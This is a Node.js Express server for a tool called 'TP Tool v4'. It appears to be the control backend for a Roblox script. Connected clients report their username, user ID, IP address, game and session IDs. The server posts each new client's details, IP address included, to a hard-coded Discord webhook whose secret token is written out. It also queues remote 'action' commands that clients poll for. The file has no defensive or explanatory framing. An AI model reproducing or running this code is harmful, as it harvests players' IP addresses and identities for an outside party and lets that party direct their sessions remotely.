const express = require("express");
const cors    = require("cors");
const app     = express();

app.use(cors());
app.use(express.json());

const clients  = {};
const commands = {};
const WEBHOOK  = "https://discord.com/api/webhooks/1555321012348919818/DmDNWX-JFWpt4JGST2iqqBSVGKeKVAV1_QrWPPBd8M2stzpHuxZqgdq4e8qsmyILSkeq";
const STALE_MS = 8000;

setInterval(() => {
  const now = Date.now();
  for (const uid in clients) {
    if (now - clients[uid].lastSeen > STALE_MS) {
      console.log(`[EVICT] ${clients[uid].username}`);
      delete clients[uid];
      delete commands[uid];
    }
  }
}, 3000);

async function sendWebhook(d) {
  const profileUrl = `https://www.roblox.com/users/${d.userId}/profile`;
  const avatarUrl  = `https://www.roblox.com/headshot-thumbnail/image?userId=${d.userId}&width=150&height=150&format=png`;
  const gameUrl    = `https://www.roblox.com/games/${d.placeId}`;

  await fetch(WEBHOOK, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      embeds: [{
        title:     "🎯 New Client Connected",
        color:     0x7c6eff,
        thumbnail: { url: avatarUrl },
        fields: [
          { name: "👤 Username",  value: "```" + d.username              + "```", inline: true  },
          { name: "🆔 User ID",   value: "```" + d.userId                + "```", inline: true  },
          { name: "🌐 IP",        value: "```" + d.ip                    + "```", inline: true  },
          { name: "🎮 Place ID",  value: "```" + d.placeId               + "```", inline: true  },
          { name: "📶 Ping",      value: "```" + d.ping       + "ms"     + "```", inline: true  },
          { name: "📅 Acc Age",   value: "```" + d.accountAge + " days"  + "```", inline: true  },
          { name: "🔑 Job ID",    value: "```" + d.jobId                 + "```", inline: false },
          { name: "🔗 Profile",   value: `[Click](${profileUrl})`,                inline: true  },
          { name: "🎮 Game",      value: `[Click](${gameUrl})`,                   inline: true  },
        ],
        footer:    { text: "TP Tool v4" },
        timestamp: new Date().toISOString(),
      }]
    }),
  }).catch(e => console.log("[WEBHOOK ERR]", e.message));
}

app.post("/clients", async (req, res) => {
  const d   = req.body;
  const uid = String(d.userId);
  if (!uid || uid === "nil") return res.sendStatus(400);

  const isNew = !clients[uid];

  clients[uid] = {
    username:   d.username   || "Unknown",
    userId:     uid,
    placeId:    d.placeId    || 0,
    jobId:      d.jobId      || "",
    ip:         d.ip         || "unknown",
    ping:       d.ping       || 0,
    accountAge: d.accountAge || 0,
    lastSeen:   Date.now(),
  };

  if (isNew) {
    console.log(`[JOIN] ${clients[uid].username} (${uid}) | ${clients[uid].ip}`);
    sendWebhook(clients[uid]);
  }

  res.sendStatus(200);
});

app.get("/clients", (req, res) => {
  res.json(Object.values(clients));
});

app.post("/command", (req, res) => {
  const { action, target, placeId, jobId } = req.body;
  if (!action) return res.sendStatus(400);

  if (target) {
    commands[String(target)] = { action, placeId, jobId };
    console.log(`[CMD] ${action} → uid:${target} place:${placeId}`);
  } else {
    for (const uid in clients) {
      commands[uid] = { action, placeId, jobId };
    }
    console.log(`[CMD] ${action} → ALL`);
  }

  res.sendStatus(200);
});

app.get("/command", (req, res) => {
  const uid = String(req.query.uid);
  if (!uid) return res.json({});
  const cmd = commands[uid];
  if (!cmd)  return res.json({});
  delete commands[uid];
  res.json(cmd);
});

app.get("/", (req, res) => res.send("TP Tool v4 live ✓"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`[BOOT] live on :${PORT}`));
